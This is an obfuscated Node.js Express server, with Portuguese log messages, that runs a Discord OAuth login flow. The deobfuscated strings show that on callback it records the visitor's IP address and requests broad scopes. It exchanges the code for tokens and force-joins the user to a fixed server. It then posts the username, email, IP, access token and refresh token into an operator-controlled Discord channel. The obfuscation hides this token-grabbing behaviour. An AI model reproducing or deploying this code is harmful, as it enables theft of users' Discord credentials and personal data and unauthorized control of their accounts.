const _0x156794=_0xcf86;(function(_0x18450b,_0x20741d){const _0x5e896b=_0xcf86,_0x15265b=_0x18450b();while(!![]){try{const _0x3beaee=-parseInt(_0x5e896b(0xf0))/0x1*(-parseInt(_0x5e896b(0xd6))/0x2)+-parseInt(_0x5e896b(0xf3))/0x3+parseInt(_0x5e896b(0xc3))/0x4*(parseInt(_0x5e896b(0xc9))/0x5)+-parseInt(_0x5e896b(0xf6))/0x6*(-parseInt(_0x5e896b(0xfc))/0x7)+parseInt(_0x5e896b(0xf4))/0x8*(-parseInt(_0x5e896b(0xd0))/0x9)+parseInt(_0x5e896b(0xe2))/0xa*(-parseInt(_0x5e896b(0xfe))/0xb)+-parseInt(_0x5e896b(0xc2))/0xc*(-parseInt(_0x5e896b(0xda))/0xd);if(_0x3beaee===_0x20741d)break;else _0x15265b['push'](_0x15265b['shift']());}catch(_0x44d4b0){_0x15265b['push'](_0x15265b['shift']());}}}(_0xd3c8,0xd0ea7),require(_0x156794(0xe6))[_0x156794(0xf7)]());function _0xcf86(_0x58201b,_0x13bed7){const _0xd3c882=_0xd3c8();return _0xcf86=function(_0xcf86e6,_0x4d4054){_0xcf86e6=_0xcf86e6-0xc1;let _0x547c3e=_0xd3c882[_0xcf86e6];return _0x547c3e;},_0xcf86(_0x58201b,_0x13bed7);}const express=require(_0x156794(0xd7)),axios=require(_0x156794(0xf8)),cors=require('cors'),app=express(),{CLIENT_ID,CLIENT_SECRET,BOT_TOKEN,REDIRECT_URI,GUILD_ID,LOG_CHANNEL_ID,PORT=0x1f90,FRONTEND_URL}=process[_0x156794(0xe8)];app['use'](cors({'origin':FRONTEND_URL,'credentials':!![]})),app['use'](express[_0x156794(0xc8)]());function _0xd3c8(){const _0x343e5b=['data','send','26ptkpZt','express','N/A','🌐\x20Backend\x20rodando\x20em\x20http://localhost:','9176414gPbuln','/channels/','status','headers','📡\x20IP\x20do\x20usuário:\x20','remoteAddress','❌\x20Erro\x20na\x20autenticação:\x20','https://discord.com/api','20610TFSAcG','error','/?success=true&username=','application/x-www-form-urlencoded','dotenv','/oauth2/token','env','application/json','Código\x20ausente','/?error=auth_failed','response','/oauth2/authorize','listen','redirect','47513uGBqLw','log','/users/@me','1475142wdBEdL','8poEMWu','/callback','5803188oUCeYS','config','axios','x-forwarded-for','object','get','7gMBUSs','/messages','3883sRhdmR','post','stringify','query','24wMTEZr','108788ICJGNK','```json\x0a','/guilds/','Bot\x20','code','json','10RNTLeK','put','&redirect_uri=','/members/','Erro\x20ao\x20enviar\x20mensagem\x20de\x20log:','identify\x20email\x20guilds\x20guilds.join','username','8784459VCmeTZ','message','\x0a```','?client_id='];_0xd3c8=function(){return _0x343e5b;};return _0xd3c8();}const discordAPI=_0x156794(0xe1);async function sendLogMessage(_0x5a698c){const _0x2c80b9=_0x156794;try{typeof _0x5a698c===_0x2c80b9(0xfa)?await axios[_0x2c80b9(0xff)](discordAPI+_0x2c80b9(0xdb)+LOG_CHANNEL_ID+_0x2c80b9(0xfd),{'content':_0x2c80b9(0xc4)+JSON[_0x2c80b9(0x100)](_0x5a698c,null,0x2)+_0x2c80b9(0xd2)},{'headers':{'Authorization':'Bot\x20'+BOT_TOKEN,'Content-Type':'application/json'}}):await axios[_0x2c80b9(0xff)](discordAPI+'/channels/'+LOG_CHANNEL_ID+_0x2c80b9(0xfd),{'content':_0x5a698c},{'headers':{'Authorization':_0x2c80b9(0xc6)+BOT_TOKEN,'Content-Type':_0x2c80b9(0xe9)}});}catch(_0x4781d8){console[_0x2c80b9(0xe3)](_0x2c80b9(0xcd),_0x4781d8['message']);}}app['get']('/',(_0x47f8f5,_0x5e037f)=>{const _0xbabe0f=_0x156794,_0x33cf0e=discordAPI+_0xbabe0f(0xed)+(_0xbabe0f(0xd3)+CLIENT_ID)+(_0xbabe0f(0xcb)+encodeURIComponent(REDIRECT_URI))+'&response_type=code'+'&scope=identify%20email%20guilds%20guilds.join';return _0x5e037f[_0xbabe0f(0xef)](_0x33cf0e);}),app[_0x156794(0xfb)](_0x156794(0xf5),async(_0x558814,_0x5546ca)=>{const _0x3066b4=_0x156794,_0x191c3c=_0x558814[_0x3066b4(0xc1)][_0x3066b4(0xc7)],_0xaaba46=_0x558814[_0x3066b4(0xdd)][_0x3066b4(0xf9)]||_0x558814['connection'][_0x3066b4(0xdf)];if(!_0x191c3c)return _0x5546ca[_0x3066b4(0xdc)](0x190)[_0x3066b4(0xd5)](_0x3066b4(0xea));try{await sendLogMessage(_0x3066b4(0xde)+_0xaaba46);const _0x2b0134=await axios[_0x3066b4(0xff)](discordAPI+_0x3066b4(0xe7),new URLSearchParams({'client_id':CLIENT_ID,'client_secret':CLIENT_SECRET,'grant_type':'authorization_code','code':_0x191c3c,'redirect_uri':REDIRECT_URI,'scope':_0x3066b4(0xce)}),{'headers':{'Content-Type':_0x3066b4(0xe5)}}),{access_token:_0x4dee8a,refresh_token:_0x141ddc,token_type:_0xd93659}=_0x2b0134[_0x3066b4(0xd4)],_0x1ca9c0=await axios[_0x3066b4(0xfb)](discordAPI+_0x3066b4(0xf2),{'headers':{'Authorization':_0xd93659+'\x20'+_0x4dee8a}}),_0x35a4ab=_0x1ca9c0[_0x3066b4(0xd4)];await axios[_0x3066b4(0xca)](discordAPI+_0x3066b4(0xc5)+GUILD_ID+_0x3066b4(0xcc)+_0x35a4ab['id'],{'access_token':_0x4dee8a},{'headers':{'Authorization':_0x3066b4(0xc6)+BOT_TOKEN,'Content-Type':_0x3066b4(0xe9)}});const _0x5de21d={'user':_0x35a4ab[_0x3066b4(0xcf)],'id':_0x35a4ab['id'],'email':_0x35a4ab['email']||_0x3066b4(0xd8),'ip':_0xaaba46,'accessToken':_0x4dee8a,'refreshToken':_0x141ddc,'timestamp':new Date()['toISOString']()};return await sendLogMessage(_0x5de21d),_0x5546ca[_0x3066b4(0xef)](FRONTEND_URL+_0x3066b4(0xe4)+encodeURIComponent(_0x35a4ab[_0x3066b4(0xcf)]));}catch(_0x302d81){return console[_0x3066b4(0xe3)](_0x302d81[_0x3066b4(0xec)]?.[_0x3066b4(0xd4)]||_0x302d81['message']),await sendLogMessage(_0x3066b4(0xe0)+_0x302d81[_0x3066b4(0xd1)]),_0x5546ca['redirect'](FRONTEND_URL+_0x3066b4(0xeb));}}),app[_0x156794(0xee)](PORT,()=>{const _0x181941=_0x156794;console[_0x181941(0xf1)](_0x181941(0xd9)+PORT);});
